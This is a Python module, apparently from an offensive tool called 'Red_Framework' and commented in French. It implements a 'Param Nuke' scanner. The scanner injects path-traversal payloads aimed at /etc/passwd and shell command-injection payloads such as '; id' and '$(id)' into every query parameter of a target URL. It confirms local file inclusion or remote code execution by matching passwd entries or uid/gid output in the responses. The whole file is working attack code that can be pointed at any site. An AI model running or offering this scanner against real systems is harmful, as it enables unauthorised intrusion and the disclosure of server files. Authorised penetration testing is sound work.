import asyncio
import aiohttp
import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from core.reporter import add_finding

# L'arsenal lourd : Payloads LFI (Fichiers) et RCE (Commandes)
PAYLOADS = [
    "../../../etc/passwd",
    "../../../../../../../../etc/passwd",
    "/etc/passwd",
    "| id",
    "; id",
    "`id`",
    "$(id)",
    "& whoami",
    "| whoami",
    "; whoami"
]

# Les signatures qui prouvent qu'on a percé l'armure
SIGNATURES = {
    "LFI (Fichier lu)": re.compile(r"root:[x*]:0:0:"),
    "RCE (Commande exécutée)": re.compile(r"uid=\d+\(.*\) gid=\d+\(.*\)"),
    "RCE (Serveur Web)": re.compile(r"www-data")
}

USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Red_Framework/1.0"

async def fire_payload(session, base_url, param_name, payload, original_params, semaphore):
    """Injecte un payload spécifique dans un paramètre ciblé."""
    # On copie les paramètres originaux pour ne modifier que la cible
    params = original_params.copy()
    params[param_name] = payload
    
    # On reconstruit l'URL avec le payload injecté
    encoded_params = urlencode(params, doseq=True)
    parsed = urlparse(base_url)
    target_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, encoded_params, parsed.fragment))

    async with semaphore:
        try:
            timeout = aiohttp.ClientTimeout(total=5)
            async with session.get(target_url, headers={"User-Agent": USER_AGENT}, timeout=timeout) as resp:
                content = await resp.text()
                
                # Analyse de la réponse à la recherche de nos signatures
                for vuln_type, regex in SIGNATURES.items():
                    if regex.search(content):
                        print(f"\n[\033[91m!\033[0m] \033[1mCRITIQUE - {vuln_type} TROUVÉ !\033[0m")
                        print(f"    -> Paramètre : {param_name}")
                        print(f"    -> Payload   : {payload}")
                        print(f"    -> Preuve URL: {target_url}")
                        
                        add_finding("Param Nuke", base_url, f"🚨 **{vuln_type}** sur `?{param_name}=` via payload: `{payload}`")
                        return 1
        except Exception:
            pass
    return 0

async def async_nuke(url, threads):
    parsed = urlparse(url)
    query_params = parse_qs(parsed.query)
    
    if not query_params:
        print("[-] Erreur : L'URL ne contient aucun paramètre à attaquer (ex: ?id=1).")
        return

    base_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, "", "", ""))
    print(f"[*] Démarrage du Param Nuke sur {base_url}")
    print(f"[*] Paramètres détectés : {list(query_params.keys())}")
    
    semaphore = asyncio.Semaphore(threads)
    tasks = []
    
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=0, ssl=False)) as session:
        # On attaque chaque paramètre avec chaque payload
        for param in query_params.keys():
            print(f"[*] Verrouillage de la cible sur le paramètre : '{param}'...")
            for payload in PAYLOADS:
                tasks.append(fire_payload(session, base_url, param, payload, query_params, semaphore))
                
        results = await asyncio.gather(*tasks)

    # Bilan des dégâts
    hits = sum(results)
    print("\n-------------------------------------------------")
    if hits == 0:
        print("[\033[93m-\033[0m] Cessez-le-feu : Aucun payload n'a percé les défenses.")
    else:
        print(f"[\033[91m!\033[0m] \033[1mCible détruite : {hits} vulnérabilité(s) critique(s) confirmée(s) !\033[0m")
    print("-------------------------------------------------")

def run_nuke(args):
    try:
        asyncio.run(async_nuke(args.url, args.threads))
    except KeyboardInterrupt:
        print("\n[-] Tir avorté par l'opérateur.")